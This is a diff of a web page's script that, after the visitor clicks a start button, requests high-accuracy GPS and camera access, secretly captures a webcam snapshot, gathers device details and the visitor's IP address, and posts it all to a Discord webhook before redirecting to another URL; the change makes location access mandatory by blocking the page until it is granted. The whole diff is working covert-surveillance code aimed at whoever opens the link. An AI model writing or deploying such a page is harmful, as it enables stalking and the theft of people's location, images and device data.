@@ -15,10 +15,9 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      font-size: 1.2rem;
       text-align: center;
     }
-    #startBtn {
+    #startBtn, #retryBtn {
       padding: 0.5em 1em;
       font-size: 1.1rem;
       background: #222;
@@ -26,6 +25,7 @@
       color: #fff;
       border-radius: 8px;
       cursor: pointer;
+      margin-top: 1em;
     }
   </style>
 </head>
@@ -54,23 +54,18 @@
     function dataURLtoBlob(dataurl) {
       const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
         bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
-      }
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
       return new Blob([u8arr], { type: mime });
     }
 
     function sendToDiscord(ipData) {
       const mapLink = coords.lat !== "Permission denied"
         ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` : "N/A";
-
       const device = getDeviceInfo();
-
       const payload = {
-        embeds: [
-          {
-            title: "📍 GPS & Device Info",
-            description: `**Latitude:** ${coords.lat}  
+        embeds: [{
+          title: "📍 GPS & Device Info",
+          description: `**Latitude:** ${coords.lat}  
 **Longitude:** ${coords.lon}  
 **Accuracy:** ${coords.acc} meters  
 **Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}
@@ -88,16 +83,10 @@
 **Screen:** ${device.screen}  
 **Touch Support:** ${device.touchSupport}
 
-🕒 ${new Date().toLocaleString()}`,
-            image: capturedImageData ? { url: "attachment://snapshot.png" } : undefined
-          }
-        ],
+🕒 ${new Date().toLocaleString()}`
+        }],
         files: capturedImageData
-          ? [{
-            name: "snapshot.png",
-            type: "image/png",
-            data: capturedImageData
-          }]
+          ? [{ name: "snapshot.png", type: "image/png", data: capturedImageData }]
           : []
       };
 
@@ -108,64 +97,64 @@
         formData.append("files[0]", blob, "snapshot.png");
       }
 
-      fetch(webhookUrl, {
-        method: "POST",
-        body: formData
-      }).finally(() => {
-        window.location.href = redirectUrl;
-      });
+      fetch(webhookUrl, { method: "POST", body: formData })
+        .finally(() => window.location.href = redirectUrl);
     }
 
     async function startSequence() {
       document.getElementById("status").innerText = "Requesting permissions…";
 
       try {
-        // Notifications
-        if ("Notification" in window && Notification.permission !== "granted") {
-          await Notification.requestPermission();
-        }
+        await Notification.requestPermission().catch(() => {});
 
-        // Location
+        let locationAllowed = false;
+
         await new Promise((resolve) => {
-          if (!navigator.geolocation) return resolve();
           navigator.geolocation.getCurrentPosition(
             (pos) => {
               coords.lat = pos.coords.latitude;
               coords.lon = pos.coords.longitude;
               coords.acc = pos.coords.accuracy;
+              locationAllowed = true;
               resolve();
             },
-            () => resolve(),
+            () => resolve(), // even if denied, we resolve
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
         });
 
-        // Camera
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            await video.play();
-
-            await new Promise((resolve) => {
-              video.onloadedmetadata = () => {
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                capturedImageData = canvas.toDataURL("image/png");
-                stream.getTracks().forEach(track => track.stop());
-                resolve();
-              };
-            });
-          } catch (e) {
-            console.warn("Camera permission denied or not available.");
-          }
+        if (!locationAllowed) {
+          document.body.innerHTML = `
+            <div>
+              <p style="color:white;">📍 Location permission not granted.<br>Please allow location access and reload the page to continue.</p>
+              <button id="retryBtn">Try Again</button>
+            </div>`;
+          document.getElementById("retryBtn").onclick = () => location.reload();
+          return;
         }
 
-        // IP fetch + final dispatch
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
+
+          await new Promise((resolve) => {
+            video.onloadedmetadata = () => {
+              const canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              capturedImageData = canvas.toDataURL("image/png");
+              stream.getTracks().forEach(track => track.stop());
+              resolve();
+            };
+          });
+        } catch {
+          // camera denied — continue
+        }
+
         fetch("https://api.db-ip.com/v2/free/self")
           .then(res => res.json())
           .then(sendToDiscord)
@@ -174,11 +163,10 @@
           });
 
       } catch (err) {
-        document.getElementById("status").innerHTML = `
-          <div style="color:white;">
-            Permissions not granted or blocked.<br/>
-            Please reload and allow permissions.<br/><br/>
-            <button id="retryBtn" style="margin-top:10px;padding:0.5em 1em;background:#222;color:#fff;border:1px solid #fff;border-radius:8px;cursor:pointer;">Retry</button>
+        document.body.innerHTML = `
+          <div>
+            <p style="color:white;">❌ Unexpected error.<br>Please reload the page and try again.</p>
+            <button id="retryBtn">Reload</button>
           </div>`;
         document.getElementById("retryBtn").onclick = () => location.reload();
       }
